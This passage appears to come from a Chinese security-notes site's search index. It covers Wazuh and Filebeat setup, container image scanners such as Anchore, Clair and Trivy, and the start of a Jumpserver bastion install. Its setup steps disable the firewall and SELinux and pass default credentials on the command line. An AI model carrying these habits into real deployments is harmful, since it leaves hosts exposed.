kibana.service","title":"Kibana\u5b89\u88c5Wazuh\u63d2\u4ef6"},{"location":"ids_ips/wazuh/#kibana-wazuhwazuh-api","text":"\u9ed8\u8ba4\u7684\u8d26\u53f7\u5bc6\u7801\u662f\uff1afoo/bar\uff0cip\u5730\u5740\u5c31\u662f\u4f60\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u7aef\u53e3\u662f55000\u3002 \u5b98\u65b9\u94fe\u63a5 \u6b64\u65f6\uff0c\u5728Kibana\u7684Wazuh\u63d2\u4ef6\u662f\u6ca1\u6709\u6570\u636e\u7684\uff0c\u56e0\u4e3a\u8fd8\u6ca1\u6709\u914d\u7f6e\u65e5\u5fd7\u89e3\u6790\u3002","title":"Kibana Wazuh\u63d2\u4ef6\u914d\u7f6eWazuh API\u8d26\u53f7\u5bc6\u7801"},{"location":"ids_ips/wazuh/#_1","text":"\u4e0b\u8f7d\u6a21\u7248\u6587\u4ef6 # \u4e0b\u8f7dfilebeat\u914d\u7f6e\u6587\u4ef6 curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/filebeat/7.x/filebeat.yml chmod go+r /etc/filebeat/filebeat.yml # \u4e0b\u8f7delasticsearch\u7684\u6a21\u7248\u6587\u4ef6 curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/elasticsearch/7.x/wazuh-template.json chmod go+r /etc/filebeat/wazuh-template.json \u914d\u7f6eFilebeat output.elasticsearch: hosts: ['http://YOUR_ELASTIC_SERVER_IP:9200'] # \u4fee\u6539\u4e3a output.elasticsearch: hosts: ['http://10.10.10.24:9200'] \u914d\u7f6e\u5b8c\u6210\u4ee5\u540e\uff0c\u91cd\u542f\u670d\u52a1\uff0c\u5c31\u53ef\u4ee5\u5728Kibana Wazuh\u63d2\u4ef6\u4e2d\u770b\u5230\u6570\u636e\u4e86\u3002","title":"\u914d\u7f6e\u91c7\u96c6\u65e5\u5fd7\u6a21\u7248"},{"location":"ids_ips/wazuh/#wazuh-client","text":"# Client IP\uff1a10.10.10.25 # \u5b89\u88c5agent rpm -ivh wazuh-agent-3.9.2-1.x86_64.rpm # \u6b64\u65f6wazuh-agent\u7684\u670d\u52a1\u662f\u542f\u52a8\u5931\u8d25\u7684\uff0c\u56e0\u4e3a\u6ca1\u6709\u8ba4\u8bc1\u6587\u4ef6 \u9996\u5148\u5728\u670d\u52a1\u7aef\u751f\u6210\u5bc6\u94a5\uff1a \u5ba2\u6237\u7aef\u5bfc\u5165\u6587\u4ef6 \u5ba2\u6237\u7aef\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff1avim /var/ossec/etc/ossec.conf # \u914d\u7f6e\u670d\u52a1\u7aefIP\u5730\u5740\u4e0e\u7aef\u53e3 server address 10.10.10.24 /address port 1514 /port protocol udp /protocol /server \u91cd\u542fwazuh-agent\uff0c\u5728Kibana\u4e0a\u67e5\u770b\u6570\u636e /var/ossec/bin/ossec-control restart","title":"wazuh client\u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"ids_ips/wazuh/#_2","text":"\u4e3b\u8981\u662f\u4e3a\u4e86\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u5c31\u505a\u597d\u5ba2\u6237\u7aef\u5b89\u88c5\u3002 \u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u811a\u672c\u5b9e\u73b0 \u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u628awazuh\u7684\u811a\u672c\u4e32\u5230\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u811a\u672c\u4e2d\u3002 # \u5728\u5f00\u5934\u6dfb\u52a0\u5982\u4e0b\u4fe1\u606f # \u5b89\u88c5\u5ba2\u6237\u7aef rpm -qa|grep wazuh-agent-3.9.3-1.x86_64 if [ $? -eq 0 ];then echo file exists exit fi wget https://packages.wazuh.com/3.x/yum/wazuh-agent-3.9.3-1.x86_64.rpm rpm -ivh wazuh-agent-3.9.3-1.x86_64.rpm sed -i '10c address server_ip /address ' /var/ossec/etc/ossec.conf","title":"\u5ba2\u6237\u7aef\u81ea\u52a8\u5316\u90e8\u7f72"},{"location":"ids_ips/wazuh/#wazuh_1","text":"","title":"wazuh\u89c4\u5219\u5b66\u4e60"},{"location":"ids_ips/wazuh/#_3","text":"","title":"\u89c4\u5219\u6587\u4ef6\u89e3\u8bfb"},{"location":"ids_ips/wazuh/#ssh","text":"ls /var/ossec/ruleset/rules | grep ssh # 0095-sshd_rules.xml # sshd: Possible attack on the ssh server # sshd: insecure connection attempt (scan). \u5982\u679c\u662f\u963f\u91cc\u4e91\u7684\u4e3b\u673a\uff0c\u4f1a\u6709\u5f88\u591a\u6b64\u7c7b\u578b\u7684\u65e5\u5fd7\uff0c\u662f\u963f\u91cc\u4e91\u81ea\u5df1\u7684\u626b\u63cf ls /var/ossec/ruleset/rules | grep pam # 0085-pam_rules.xml","title":"SSH\u76f8\u5173\u89c4\u5219\u6587\u4ef6"},{"location":"infrastructure-security/","text":"\u57fa\u7840\u8bbe\u65bd\u5b89\u5168 \u53c2\u8003\u8d44\u6599 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u57fa\u7840\u5b89\u5168\u5efa\u8bbe","title":"\u57fa\u7840\u8bbe\u65bd\u5b89\u5168"},{"location":"infrastructure-security/#_1","text":"","title":"\u57fa\u7840\u8bbe\u65bd\u5b89\u5168"},{"location":"infrastructure-security/#_2","text":"\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u57fa\u7840\u5b89\u5168\u5efa\u8bbe","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/container/","text":"\u5bb9\u5668\u5b89\u5168\u5efa\u8bbe \u5b98\u7f51\u5730\u5740 Docker\u5b89\u5168\u6280\u672f\u5b66\u4e60 \u601d\u8003\u4e86\u534a\u5929\uff0c\u653e\u4e2a\u56fe\u8d34\u4e00\u4e9b\u53c2\u8003\u94fe\u63a5\u5927\u5bb6\u81ea\u884c\u9605\u8bfb\u5427\uff0c\u597d\u4e1c\u897f\u4e0d\u591a\u8bf4\u3002 \u5bb9\u5668\u5b89\u5168\u5185\u5bb9 \u601d\u7ef4\u5bfc\u56fe\u6301\u7eed\u66f4\u65b0 \u53c2\u8003\u8d44\u6599 \u63a2\u7d22\u5bb9\u5668\u5b89\u5168\u6027\uff1a\u6982\u8ff0 2018 \u7eff\u76df\u79d1\u6280\u5bb9\u5668\u5b89\u5168\u6280\u672f\u62a5\u544a Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e00\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e8c\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e09\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u56db\uff09 Docker\u5bb9\u5668\u6700\u4f73\u5b89\u5168\u5b9e\u8df5\u767d\u76ae\u4e66 76%\u90fd\u5b58\u5728\u6f0f\u6d1e\uff1f\uff01Docker\u955c\u50cf\u5b89\u5168\u626b\u63cf\u5e94\u8be5\u8fd9\u6837\u505a [ Docker\u5bb9\u5668\u6784\u5efa\u8fc7\u7a0b\u7684\u5b89\u5168\u6027\u5206\u6790 ]","title":"\u5bb9\u5668\u5b89\u5168\u5efa\u8bbe"},{"location":"infrastructure-security/container/#_1","text":"\u5b98\u7f51\u5730\u5740 Docker\u5b89\u5168\u6280\u672f\u5b66\u4e60 \u601d\u8003\u4e86\u534a\u5929\uff0c\u653e\u4e2a\u56fe\u8d34\u4e00\u4e9b\u53c2\u8003\u94fe\u63a5\u5927\u5bb6\u81ea\u884c\u9605\u8bfb\u5427\uff0c\u597d\u4e1c\u897f\u4e0d\u591a\u8bf4\u3002","title":"\u5bb9\u5668\u5b89\u5168\u5efa\u8bbe"},{"location":"infrastructure-security/container/#_2","text":"\u601d\u7ef4\u5bfc\u56fe\u6301\u7eed\u66f4\u65b0","title":"\u5bb9\u5668\u5b89\u5168\u5185\u5bb9"},{"location":"infrastructure-security/container/#_3","text":"\u63a2\u7d22\u5bb9\u5668\u5b89\u5168\u6027\uff1a\u6982\u8ff0 2018 \u7eff\u76df\u79d1\u6280\u5bb9\u5668\u5b89\u5168\u6280\u672f\u62a5\u544a Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e00\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e8c\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e09\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u56db\uff09 Docker\u5bb9\u5668\u6700\u4f73\u5b89\u5168\u5b9e\u8df5\u767d\u76ae\u4e66 76%\u90fd\u5b58\u5728\u6f0f\u6d1e\uff1f\uff01Docker\u955c\u50cf\u5b89\u5168\u626b\u63cf\u5e94\u8be5\u8fd9\u6837\u505a [ Docker\u5bb9\u5668\u6784\u5efa\u8fc7\u7a0b\u7684\u5b89\u5168\u6027\u5206\u6790 ]","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/container/tools/","text":"\u5bb9\u5668\u5b89\u5168\u5de5\u5177 Anchore Engine\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b \u5b89\u88c5\u6587\u6863 # \u73af\u5883\u6982\u8ff0 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # Docker\u7248\u672c\uff1a18.09.6 # Docker-Compose\u7248\u672c\uff1a1.24.0 # \u521b\u5efa\u76ee\u5f55 mkdir anchore cd anchore # \u4e0b\u8f7d\u955c\u50cf docker pull docker.io/anchore/anchore-engine:latest # \u521b\u5efa\u5bb9\u5668 docker create --name ae docker.io/anchore/anchore-engine:latest # \u62f7\u8d1d\u914d\u7f6e\u6587\u4ef6 docker cp ae:/docker-compose.yaml docker-compose.yaml # \u5220\u9664\u5bb9\u5668 docker rm ae # \u542f\u52a8\u5bb9\u5668 docker-compose pull docker-compose up -d # \u5b89\u88c5anchore-cli curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py pip install anchorecli anchore-cli --version \u4f7f\u7528\u8fc7\u7a0b \u4f7f\u7528\u6587\u6863 # \u67e5\u770b\u5b89\u88c5\u72b6\u6001 anchore-cli --u admin --p foobar system status # \u6570\u636e\u5e93\u540c\u6b65\u72b6\u6001 anchore-cli --u admin --p foobar system feeds list # \u7b49\u5f85\u540c\u6b65\u5b8c\u6210\uff0c\u6dfb\u52a0\u955c\u50cf\u5230anchore engine\u8fdb\u884c\u5206\u6790 anchore-cli --u admin --p foobar image add docker.io/library/nginx:latest # \u67e5\u770b\u8fdb\u5ea6 anchore-cli --u admin --p foobar image list # \u7b49\u5f85\u5206\u6790\u5b8c\u6210\uff0c\u67e5\u770b\u8be6\u60c5 anchore-cli --u admin --p foobar image get docker.io/library/nginx:latest # \u67e5\u770b\u6f0f\u6d1e anchore-cli --u admin --p foobar image vuln docker.io/library/nginx:latest os Anchore Engine\u8d26\u6237\u7ba1\u7406 \u5b98\u7f51\u5730\u5740 # \u67e5\u770b\u7528\u6237 anchore-cli --u admin --p foobar account list # \u8bbe\u7f6e\u5bc6\u7801 anchore-cli --u admin --p foobar account user setpassword New_Password Anchore Engine\u6ce8\u518c\u4ed3\u5e93 anchore-cli --u admin --p foobar registry add registry_name user pass \u5173\u4e8eAnchore Engine\u7684\u5bc6\u7801\u4fdd\u5b58\u95ee\u9898 \u4f7f\u7528alias\u547d\u4ee4\uff0c\u5728Jenkins CI/CD\u6d41\u7a0b\u4e2d\u4e0d\u5c55\u793a\u5bc6\u7801\uff1b \u4f7f\u7528shell\u811a\u672c\u53ea\u60f3anchore-cli\u547d\u4ee4\uff1b\uff08\u4ee5\u4e0a\u4e24\u79cd\u505a\u6cd5\u90fd\u53ea\u80fd\u907f\u514d\u5728Jenkins\u7684\u754c\u9762\u51fa\u73b0\u8d26\u53f7\u5bc6\u7801\uff09 Anchore API \u5b98\u7f51\u5730\u5740 \u6253\u5f00swagger.json\u6587\u4ef6\uff0c\u590d\u5236\u5168\u90e8\u5185\u5bb9\u5230 swagger\u5728\u7ebf\u7f16\u8f91\u5de5\u5177\u4e2d Clair\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b \u5b89\u88c5\u6587\u6863 # \u521b\u5efa\u76ee\u5f55 mkdir clair cd clair # \u4e0b\u8f7d\u6587\u4ef6 curl -L https://raw.githubusercontent.com/coreos/clair/master/contrib/compose/docker-compose.yml -o docker-compose.yml # \u521b\u5efa\u914d\u7f6e\u6587\u4ef6 mkdir clair_config curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o ./clair_config/config.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim ./clair_config/config.yaml # \u6ce8\u91ca\u4ee5\u4e0b\u8fd9\u884c # source: host=localhost port=5432 user=postgres sslmode=disable statement_timeout=60000 # \u6dfb\u52a0 source: postgresql://postgres:password@postgres:5432?sslmode=disable # \u542f\u52a8 docker-compose pull docker-compose up -d \u5ba2\u6237\u7aef\u5b89\u88c5 clairctl \uff1a[ \u5b98\u7f51\u5730\u5740 ] clair api \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u76ee\u524d\u5df2\u7ecf\u4e0d\u80fd\u8bbf\u95ee\u4e86\u3002 klar \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u53ea\u652f\u6301\u8ddfregistry\u96c6\u6210\u3002 yari \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u53ea\u652f\u6301\u8ddfregistry\u96c6\u6210\uff0cyair\u4f7f\u7528python\u5199\u7684\uff0c\u53ef\u4ee5\u81ea\u5df1\u4fee\u6539\u3002 analyze-local-images \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5df2\u7ecf\u88ab\u653e\u5f03\u4e86\uff0c\u53ea\u652f\u6301clair v1/v2\u3002 \u4f7f\u7528\u8fc7\u7a0b [ \u5728\u7ebf\u6559\u7a0b\uff0c\u4f7f\u7528klar\u4f5c\u4e3a\u5ba2\u6237\u7aef\u5de5\u5177 ] # \u4f7f\u7528clairctl # \u5728release\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff1a1.2.8 Trivy\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b \u5b89\u88c5\u6587\u6863 # \u4f7f\u7528rpm\u76f4\u63a5\u5b89\u88c5 rpm -ivh trivy_0.0.15_Linux-64bit.rpm \u4f7f\u7528\u8fc7\u7a0b # \u626b\u63cf\u955c\u50cf\uff0c\u7b2c\u4e00\u6b21\u626b\u63cf\u4f1a\u5f88\u6162\uff0c\u56e0\u4e3a\u9700\u8981\u66f4\u65b0\u6f0f\u6d1e\u5e93 trivy docker.io/library/nginx:latest Docker Bench\uff1a\u5bb9\u5668\u5b89\u5168\u57fa\u7ebf\u68c0\u6d4b\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b git clone https://github.com/docker/docker-bench-security.git cd docker-bench-security bash docker-bench-security.sh \u4f7f\u7528\u8fc7\u7a0b bash docker-bench-security.sh -h Docker Scan\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u8fc7\u7a0b pip3 install dockerscan \u4f7f\u7528\u8fc7\u7a0b dockerscan -h OpenSCAP \u5de5\u5177\u5bf9\u6bd4 \u5bf9\u6bd4\u9879/\u5de5\u5177 Anchore Clair Trivy Docker-Bench DockerScan \u5b89\u88c5 docker-compose docker-compose yum\u76f4\u63a5\u5b89\u88c5 shell\u76f4\u63a5\u6267\u884c pip\u5b89\u88c5 \u8bed\u8a00 Python Go Go Shell Python \u626b\u63cf\u65b9\u5f0f CVE\u6f0f\u6d1e\u5e93\u626b\u63cf CVE\u6f0f\u6d1e\u5e93\u626b\u63cf CVE\u6f0f\u6d1e\u5e93\u626b\u63cf \u57fa\u7ebf\u68c0\u6d4b\u89c4\u5219 \u626b\u63cfor\u5206\u6790\u89c4\u5219\uff0c\u4e3b\u8981\u7528\u4e8e\u653b\u51fb \u626b\u63cf\u901f\u5ea6 \u51e0\u5206\u949f \u51e0\u5206\u949f \u51e0\u5206\u949f \u5f88\u5feb \u5f88\u5feb \u8de8\u5e73\u53f0\u6027 \u5177\u5907\u826f\u597d\u7684\u8de8\u5e73\u53f0\u6027 \u540c\u524d \u540c\u524d \u540c\u524d \u540c\u524d \u63a8\u8350\u4f7f\u7528\uff1aAnchore+Docker Bench\u7684\u7ec4\u5408 \u63a8\u8350\u7406\u7531\uff1aanchore\u76ee\u524d\u5df2\u6709\u5546\u4e1a\u7248\uff0c\u514d\u8d39\u7248\u4e5f\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u7edf\u4e00\u4f7f\u7528\u96be\u5ea6\u4e5f\u5f88\u4f4e\uff0c\u540c\u6837Anchore\u4e0eGitlab-CI\u6216\u8005Jenkins\u96c6\u6210\u53cb\u597d\u3002 \u53c2\u8003\u8d44\u6599 \u5168\u9762\u6613\u7528\u7684\u955c\u50cf\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177\uff1aTrivy \u5bb9\u5668\u9759\u6001\u5b89\u5168\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177Clair\u4ecb\u7ecd Docker\u5b89\u5168\u81ea\u52a8\u5316\u626b\u63cf\u5de5\u5177\u5bf9\u6bd4\u6d4b\u8bd5 29 Docker security tools compared","title":"\u5bb9\u5668\u5b89\u5168\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_1","text":"","title":"\u5bb9\u5668\u5b89\u5168\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#anchore-engine","text":"\u5b98\u7f51\u5730\u5740","title":"Anchore Engine\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_2","text":"\u5b89\u88c5\u6587\u6863 # \u73af\u5883\u6982\u8ff0 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # Docker\u7248\u672c\uff1a18.09.6 # Docker-Compose\u7248\u672c\uff1a1.24.0 # \u521b\u5efa\u76ee\u5f55 mkdir anchore cd anchore # \u4e0b\u8f7d\u955c\u50cf docker pull docker.io/anchore/anchore-engine:latest # \u521b\u5efa\u5bb9\u5668 docker create --name ae docker.io/anchore/anchore-engine:latest # \u62f7\u8d1d\u914d\u7f6e\u6587\u4ef6 docker cp ae:/docker-compose.yaml docker-compose.yaml # \u5220\u9664\u5bb9\u5668 docker rm ae # \u542f\u52a8\u5bb9\u5668 docker-compose pull docker-compose up -d # \u5b89\u88c5anchore-cli curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py pip install anchorecli anchore-cli --version","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#_3","text":"\u4f7f\u7528\u6587\u6863 # \u67e5\u770b\u5b89\u88c5\u72b6\u6001 anchore-cli --u admin --p foobar system status # \u6570\u636e\u5e93\u540c\u6b65\u72b6\u6001 anchore-cli --u admin --p foobar system feeds list # \u7b49\u5f85\u540c\u6b65\u5b8c\u6210\uff0c\u6dfb\u52a0\u955c\u50cf\u5230anchore engine\u8fdb\u884c\u5206\u6790 anchore-cli --u admin --p foobar image add docker.io/library/nginx:latest # \u67e5\u770b\u8fdb\u5ea6 anchore-cli --u admin --p foobar image list # \u7b49\u5f85\u5206\u6790\u5b8c\u6210\uff0c\u67e5\u770b\u8be6\u60c5 anchore-cli --u admin --p foobar image get docker.io/library/nginx:latest # \u67e5\u770b\u6f0f\u6d1e anchore-cli --u admin --p foobar image vuln docker.io/library/nginx:latest os","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#anchore-engine_1","text":"\u5b98\u7f51\u5730\u5740 # \u67e5\u770b\u7528\u6237 anchore-cli --u admin --p foobar account list # \u8bbe\u7f6e\u5bc6\u7801 anchore-cli --u admin --p foobar account user setpassword New_Password","title":"Anchore Engine\u8d26\u6237\u7ba1\u7406"},{"location":"infrastructure-security/container/tools/#anchore-engine_2","text":"anchore-cli --u admin --p foobar registry add registry_name user pass","title":"Anchore Engine\u6ce8\u518c\u4ed3\u5e93"},{"location":"infrastructure-security/container/tools/#anchore-engine_3","text":"\u4f7f\u7528alias\u547d\u4ee4\uff0c\u5728Jenkins CI/CD\u6d41\u7a0b\u4e2d\u4e0d\u5c55\u793a\u5bc6\u7801\uff1b \u4f7f\u7528shell\u811a\u672c\u53ea\u60f3anchore-cli\u547d\u4ee4\uff1b\uff08\u4ee5\u4e0a\u4e24\u79cd\u505a\u6cd5\u90fd\u53ea\u80fd\u907f\u514d\u5728Jenkins\u7684\u754c\u9762\u51fa\u73b0\u8d26\u53f7\u5bc6\u7801\uff09","title":"\u5173\u4e8eAnchore Engine\u7684\u5bc6\u7801\u4fdd\u5b58\u95ee\u9898"},{"location":"infrastructure-security/container/tools/#anchore-api","text":"\u5b98\u7f51\u5730\u5740 \u6253\u5f00swagger.json\u6587\u4ef6\uff0c\u590d\u5236\u5168\u90e8\u5185\u5bb9\u5230 swagger\u5728\u7ebf\u7f16\u8f91\u5de5\u5177\u4e2d","title":"Anchore API"},{"location":"infrastructure-security/container/tools/#clair","text":"\u5b98\u7f51\u5730\u5740","title":"Clair\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_4","text":"\u5b89\u88c5\u6587\u6863 # \u521b\u5efa\u76ee\u5f55 mkdir clair cd clair # \u4e0b\u8f7d\u6587\u4ef6 curl -L https://raw.githubusercontent.com/coreos/clair/master/contrib/compose/docker-compose.yml -o docker-compose.yml # \u521b\u5efa\u914d\u7f6e\u6587\u4ef6 mkdir clair_config curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o ./clair_config/config.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim ./clair_config/config.yaml # \u6ce8\u91ca\u4ee5\u4e0b\u8fd9\u884c # source: host=localhost port=5432 user=postgres sslmode=disable statement_timeout=60000 # \u6dfb\u52a0 source: postgresql://postgres:password@postgres:5432?sslmode=disable # \u542f\u52a8 docker-compose pull docker-compose up -d","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#_5","text":"clairctl \uff1a[ \u5b98\u7f51\u5730\u5740 ] clair api \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u76ee\u524d\u5df2\u7ecf\u4e0d\u80fd\u8bbf\u95ee\u4e86\u3002 klar \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u53ea\u652f\u6301\u8ddfregistry\u96c6\u6210\u3002 yari \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u53ea\u652f\u6301\u8ddfregistry\u96c6\u6210\uff0cyair\u4f7f\u7528python\u5199\u7684\uff0c\u53ef\u4ee5\u81ea\u5df1\u4fee\u6539\u3002 analyze-local-images \uff1a[ \u5b98\u7f51\u5730\u5740 ]\uff0c\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5df2\u7ecf\u88ab\u653e\u5f03\u4e86\uff0c\u53ea\u652f\u6301clair v1/v2\u3002","title":"\u5ba2\u6237\u7aef\u5b89\u88c5"},{"location":"infrastructure-security/container/tools/#_6","text":"[ \u5728\u7ebf\u6559\u7a0b\uff0c\u4f7f\u7528klar\u4f5c\u4e3a\u5ba2\u6237\u7aef\u5de5\u5177 ] # \u4f7f\u7528clairctl # \u5728release\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff1a1.2.8","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#trivy","text":"\u5b98\u7f51\u5730\u5740","title":"Trivy\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_7","text":"\u5b89\u88c5\u6587\u6863 # \u4f7f\u7528rpm\u76f4\u63a5\u5b89\u88c5 rpm -ivh trivy_0.0.15_Linux-64bit.rpm","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#_8","text":"# \u626b\u63cf\u955c\u50cf\uff0c\u7b2c\u4e00\u6b21\u626b\u63cf\u4f1a\u5f88\u6162\uff0c\u56e0\u4e3a\u9700\u8981\u66f4\u65b0\u6f0f\u6d1e\u5e93 trivy docker.io/library/nginx:latest","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#docker-bench","text":"\u5b98\u7f51\u5730\u5740","title":"Docker Bench\uff1a\u5bb9\u5668\u5b89\u5168\u57fa\u7ebf\u68c0\u6d4b\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_9","text":"git clone https://github.com/docker/docker-bench-security.git cd docker-bench-security bash docker-bench-security.sh","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#_10","text":"bash docker-bench-security.sh -h","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#docker-scan","text":"\u5b98\u7f51\u5730\u5740","title":"Docker Scan\uff1a\u955c\u50cf\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/container/tools/#_11","text":"pip3 install dockerscan","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#_12","text":"dockerscan -h","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"infrastructure-security/container/tools/#openscap","text":"","title":"OpenSCAP"},{"location":"infrastructure-security/container/tools/#_13","text":"\u5bf9\u6bd4\u9879/\u5de5\u5177 Anchore Clair Trivy Docker-Bench DockerScan \u5b89\u88c5 docker-compose docker-compose yum\u76f4\u63a5\u5b89\u88c5 shell\u76f4\u63a5\u6267\u884c pip\u5b89\u88c5 \u8bed\u8a00 Python Go Go Shell Python \u626b\u63cf\u65b9\u5f0f CVE\u6f0f\u6d1e\u5e93\u626b\u63cf CVE\u6f0f\u6d1e\u5e93\u626b\u63cf CVE\u6f0f\u6d1e\u5e93\u626b\u63cf \u57fa\u7ebf\u68c0\u6d4b\u89c4\u5219 \u626b\u63cfor\u5206\u6790\u89c4\u5219\uff0c\u4e3b\u8981\u7528\u4e8e\u653b\u51fb \u626b\u63cf\u901f\u5ea6 \u51e0\u5206\u949f \u51e0\u5206\u949f \u51e0\u5206\u949f \u5f88\u5feb \u5f88\u5feb \u8de8\u5e73\u53f0\u6027 \u5177\u5907\u826f\u597d\u7684\u8de8\u5e73\u53f0\u6027 \u540c\u524d \u540c\u524d \u540c\u524d \u540c\u524d \u63a8\u8350\u4f7f\u7528\uff1aAnchore+Docker Bench\u7684\u7ec4\u5408 \u63a8\u8350\u7406\u7531\uff1aanchore\u76ee\u524d\u5df2\u6709\u5546\u4e1a\u7248\uff0c\u514d\u8d39\u7248\u4e5f\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u7edf\u4e00\u4f7f\u7528\u96be\u5ea6\u4e5f\u5f88\u4f4e\uff0c\u540c\u6837Anchore\u4e0eGitlab-CI\u6216\u8005Jenkins\u96c6\u6210\u53cb\u597d\u3002","title":"\u5de5\u5177\u5bf9\u6bd4"},{"location":"infrastructure-security/container/tools/#_14","text":"\u5168\u9762\u6613\u7528\u7684\u955c\u50cf\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177\uff1aTrivy \u5bb9\u5668\u9759\u6001\u5b89\u5168\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177Clair\u4ecb\u7ecd Docker\u5b89\u5168\u81ea\u52a8\u5316\u626b\u63cf\u5de5\u5177\u5bf9\u6bd4\u6d4b\u8bd5 29 Docker security tools compared","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/","text":"\u4e3b\u673a\u5b89\u5168","title":"\u4e3b\u673a\u5b89\u5168"},{"location":"infrastructure-security/host-security/#_1","text":"","title":"\u4e3b\u673a\u5b89\u5168"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/","text":"jumpserver \u5f00\u6e90\u5821\u5792\u673a \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 \u5b98\u65b9\u5b89\u88c5\u6587\u6863 Centos7\u5b89\u88c5Jumpserver # \u5173\u95ed\u9632\u706b\u5899\u4e0eSELinux systemctl disable firewalld.service systemctl stop firewalld.service vim /etc/selinux/config # \u4fee\u6539\u5b57\u7b26\u96c6\uff0c\u5426\u5219\u53ef\u80fd\u62a5 input/output error\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u65e5\u5fd7\u91cc\u6253\u5370\u4e86\u4e2d\u6587\u3002 localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8 export LC_ALL=zh_CN.UTF-8 echo 'LANG= zh_CN.UTF-8 ' /etc/locale.conf \u51c6\u5907python3\u548c\u865a\u62df\u73af\u5883 yum install epel-release gcc.x86_64 -y yum install python36.x86_64 python36-devel.x86_64 -y # \u5efa\u7acbpython\u865a\u62df\u73af\u5883 cd /opt/ python3.6 